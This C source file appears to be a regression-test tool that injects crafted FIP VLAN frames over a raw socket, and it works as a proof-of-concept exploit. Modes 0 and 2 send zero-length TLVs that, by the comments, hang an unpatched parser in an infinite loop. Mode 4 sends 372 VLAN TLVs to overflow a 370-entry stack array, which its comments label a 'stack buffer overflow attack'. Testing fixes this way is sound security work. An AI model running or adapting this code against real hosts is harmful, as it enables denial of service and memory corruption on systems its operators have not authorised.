/*
 * fip_inject — inject crafted FIP VLAN notification frames for testing
 *
 * Usage: fip_inject <ifname> <mode> [dest_ifname]
 *   mode 0: send FIP VLAN notification with zero-length TLV (malformed)
 *   mode 1: send valid FIP VLAN notification
 *   mode 2: send FIP VLAN notification with zero-length TLV after valid TLVs
 *   mode 3: send FIP VLAN request (triggers VN2VN responder path)
 *   mode 4: send FIP VLAN notification with 372 VLAN TLVs (stack overflow)
 *
 *   dest_ifname: optional receiving interface whose MAC is used as
 *                the Ethernet destination. Required when injecting
 *                across a bridge (bridge drops frames whose dest MAC
 *                was learned on the ingress port). When omitted the
 *                source interface's own MAC is used, which works for
 *                a plain veth pair.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>

#define ETH_P_FIP 0x8914

/* FIP protocol constants */
#define FIP_VERSION_1    0x10
#define FIP_PROTO_VLAN   4
#define FIP_VLAN_REQ     1
#define FIP_VLAN_NOTE    2
#define FIP_TLV_MAC_ADDR 2
#define FIP_TLV_VLAN     14

#pragma pack(push, 1)

struct fiphdr {
    uint8_t  fip_version;
    uint8_t  __resvd_0;
    uint16_t fip_proto;
    uint8_t  __resvd_1;
    uint8_t  fip_subcode;
    uint16_t fip_desc_len;  /* in 32-bit words */
    uint16_t fip_flags;
};

struct fip_tlv_hdr {
    uint8_t  tlv_type;
    uint8_t  tlv_len;       /* in 32-bit words */
};

struct fip_tlv_mac_addr {
    struct fip_tlv_hdr hdr;
    unsigned char mac_addr[6];
};

struct fip_tlv_vlan {
    struct fip_tlv_hdr hdr;
    uint16_t vlan;
};

#pragma pack(pop)

static int get_mac(const char *ifname, unsigned char *mac)
{
    struct ifreq ifr;
    int fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        close(fd);
        return -1;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

static int send_fip_frame(const char *ifname, int mode,
                          const unsigned char *dst_mac)
{
    int fd, rc;
    unsigned int ifindex;
    unsigned char src_mac[6];
    struct sockaddr_ll sa;

    unsigned char *frame;
    int frame_size, frame_len = 0;

    struct ethhdr *eth;
    struct fiphdr *fh;
    unsigned char *tlv_start;
    int desc_len_bytes = 0;

    ifindex = if_nametoindex(ifname);
    if (ifindex == 0) {
        fprintf(stderr, "Cannot find interface %s\n", ifname);
        return 1;
    }

    if (get_mac(ifname, src_mac) < 0) {
        fprintf(stderr, "Cannot get MAC for %s\n", ifname);
        return 1;
    }

    fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_FIP));
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    frame_size = (mode == 4) ? 2048 : 256;
    frame = malloc(frame_size);
    if (!frame) {
        perror("malloc");
        close(fd);
        return 1;
    }
    memset(frame, 0, frame_size);

    /* Ethernet header */
    eth = (struct ethhdr *)frame;
    memcpy(eth->h_dest, dst_mac, 6);
    memcpy(eth->h_source, src_mac, 6);
    eth->h_proto = htons(ETH_P_FIP);
    frame_len = sizeof(struct ethhdr);

    /* FIP header */
    fh = (struct fiphdr *)(frame + frame_len);
    fh->fip_version = FIP_VERSION_1;
    fh->__resvd_0 = 0;
    fh->fip_proto = htons(FIP_PROTO_VLAN);
    fh->fip_subcode = FIP_VLAN_NOTE;
    fh->__resvd_1 = 0;
    fh->fip_flags = 0;
    frame_len += sizeof(struct fiphdr);

    tlv_start = frame + frame_len;

    if (mode == 0) {
        /*
         * Mode 0: Single zero-length TLV
         * This is the attack frame — tlv_type=MAC_ADDR, tlv_len=0
         * Without the fix, this causes an infinite loop.
         */
        struct fip_tlv_hdr *bad_tlv = (struct fip_tlv_hdr *)tlv_start;
        bad_tlv->tlv_type = FIP_TLV_MAC_ADDR;
        bad_tlv->tlv_len = 0;  /* THE BUG TRIGGER */
        desc_len_bytes = sizeof(struct fip_tlv_hdr);

        fh->fip_desc_len = htons(1);  /* 1 quad-word = 4 bytes */
        frame_len += 4;

    } else if (mode == 1) {
        /*
         * Mode 1: Valid FIP VLAN notification
         * MAC_ADDR TLV (type=2, len=2) + VLAN TLV (type=14, len=1)
         */
        struct fip_tlv_mac_addr *mac_tlv = (struct fip_tlv_mac_addr *)tlv_start;
        mac_tlv->hdr.tlv_type = FIP_TLV_MAC_ADDR;
        mac_tlv->hdr.tlv_len = 2;  /* 2 quad-words = 8 bytes */
        memcpy(mac_tlv->mac_addr, src_mac, 6);
        desc_len_bytes = 8;

        struct fip_tlv_vlan *vlan_tlv = (struct fip_tlv_vlan *)(tlv_start + 8);
        vlan_tlv->hdr.tlv_type = FIP_TLV_VLAN;
        vlan_tlv->hdr.tlv_len = 1;  /* 1 quad-word = 4 bytes */
        vlan_tlv->vlan = htons(100);
        desc_len_bytes += 4;

        fh->fip_desc_len = htons(desc_len_bytes >> 2);
        frame_len += desc_len_bytes;

    } else if (mode == 2) {
        /*
         * Mode 2: Valid MAC TLV followed by zero-length VLAN TLV
         */
        struct fip_tlv_mac_addr *mac_tlv = (struct fip_tlv_mac_addr *)tlv_start;
        mac_tlv->hdr.tlv_type = FIP_TLV_MAC_ADDR;
        mac_tlv->hdr.tlv_len = 2;
        memcpy(mac_tlv->mac_addr, src_mac, 6);
        desc_len_bytes = 8;

        struct fip_tlv_hdr *bad_tlv = (struct fip_tlv_hdr *)(tlv_start + 8);
        bad_tlv->tlv_type = FIP_TLV_VLAN;
        bad_tlv->tlv_len = 0;
        desc_len_bytes += 4;

        fh->fip_desc_len = htons(desc_len_bytes >> 2);
        frame_len += desc_len_bytes;

    } else if (mode == 3) {
        /*
         * Mode 3: FIP VLAN Request
         * Minimal frame with MAC_ADDR TLV — triggers fip_recv_vlan_req
         * in the VN2VN responder path.
         */
        fh->fip_subcode = FIP_VLAN_REQ;

        struct fip_tlv_mac_addr *mac_tlv = (struct fip_tlv_mac_addr *)tlv_start;
        mac_tlv->hdr.tlv_type = FIP_TLV_MAC_ADDR;
        mac_tlv->hdr.tlv_len = 2;
        memcpy(mac_tlv->mac_addr, src_mac, 6);
        desc_len_bytes = 8;

        fh->fip_desc_len = htons(desc_len_bytes >> 2);
        frame_len += desc_len_bytes;

    } else if (mode == 4) {
        /*
         * Mode 4: Stack buffer overflow attack
         * 372 VLAN TLVs (no MAC TLV needed) to overflow the 370-entry array.
         * FIP payload = 10 (header) + 372*4 (TLVs) = 1498, fits in 1500 MTU.
         */
        struct fip_tlv_vlan *vlan_tlv = (struct fip_tlv_vlan *)tlv_start;
        for (int i = 0; i < 372; i++) {
            vlan_tlv->hdr.tlv_type = FIP_TLV_VLAN;
            vlan_tlv->hdr.tlv_len = 1;
            vlan_tlv->vlan = htons(100 + i);
            desc_len_bytes += 4;
            vlan_tlv = (struct fip_tlv_vlan *)((unsigned char *)vlan_tlv + 4);
        }

        fh->fip_desc_len = htons(desc_len_bytes >> 2);
        frame_len += desc_len_bytes;

    } else {
        fprintf(stderr, "Unknown mode %d\n", mode);
        close(fd);
        free(frame);
        return 1;
    }

    /* Send via raw socket */
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_FIP);
    sa.sll_ifindex = ifindex;
    sa.sll_halen = 6;
    memcpy(sa.sll_addr, dst_mac, 6);

    rc = sendto(fd, frame, frame_len, 0, (struct sockaddr *)&sa, sizeof(sa));
    if (rc < 0) {
        perror("sendto");
        close(fd);
        free(frame);
        return 1;
    }

    printf("Sent %d-byte FIP frame (mode %d) on %s (ifindex %u)\n",
           rc, mode, ifname, ifindex);
    close(fd);
    free(frame);
    return 0;
}

int main(int argc, char **argv)
{
    int mode;
    unsigned char dst_mac[6];

    if (argc < 3) {
        fprintf(stderr, "Usage: %s <ifname> <mode> [dest_ifname]\n", argv[0]);
        fprintf(stderr, "  mode 0: zero-length TLV (attack frame)\n");
        fprintf(stderr, "  mode 1: valid FIP VLAN notification\n");
        fprintf(stderr, "  mode 2: valid MAC TLV + zero-length VLAN TLV\n");
        fprintf(stderr, "  mode 3: FIP VLAN request (VN2VN responder trigger)\n");
        fprintf(stderr, "  mode 4: 372 VLAN TLVs (stack buffer overflow attack)\n");
        fprintf(stderr, "  dest_ifname: receiver interface (use its MAC as dest)\n");
        return 1;
    }

    mode = atoi(argv[2]);

    if (argc >= 4) {
        if (get_mac(argv[3], dst_mac) < 0) {
            fprintf(stderr, "Cannot get MAC for dest interface %s\n", argv[3]);
            return 1;
        }
    } else {
        if (get_mac(argv[1], dst_mac) < 0) {
            fprintf(stderr, "Cannot get MAC for %s\n", argv[1]);
            return 1;
        }
    }

    return send_fip_frame(argv[1], mode, dst_mac);
}
